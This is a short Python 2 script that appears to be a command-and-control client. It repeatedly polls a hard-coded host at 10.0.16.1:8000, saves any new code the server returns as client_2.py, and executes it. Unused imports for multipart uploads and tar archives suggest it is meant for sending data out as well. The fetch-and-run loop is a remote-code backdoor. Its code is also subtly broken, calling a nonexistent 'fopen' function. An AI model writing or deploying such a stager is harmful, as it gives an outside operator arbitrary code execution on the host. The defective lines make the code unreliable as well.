import socket
import os
import sys
import threading
import time
import urllib2
import random
import tarfile
import platform
from poster.encode import multipart_encode
from poster.streaminghttp import register_openers
import subprocess
back_host = 'http://10.0.16.1:8000/'
def http_back(url):
	request = urllib2.urlopen(url)
	a=request.read()
	return a

while(1):
	try:
		rtn = http_back(back_host+'hi/')
		if(rtn == 'hi'):
			print 'server ok!'
			break
		else:
			print 'new client'
			fp = fopen('client_2.py', 'w')
			fp.write(rtn)
			fp.close()
		os.system("client_2.py")
	except:
		print 'Not Ready'
		time.sleep(1)
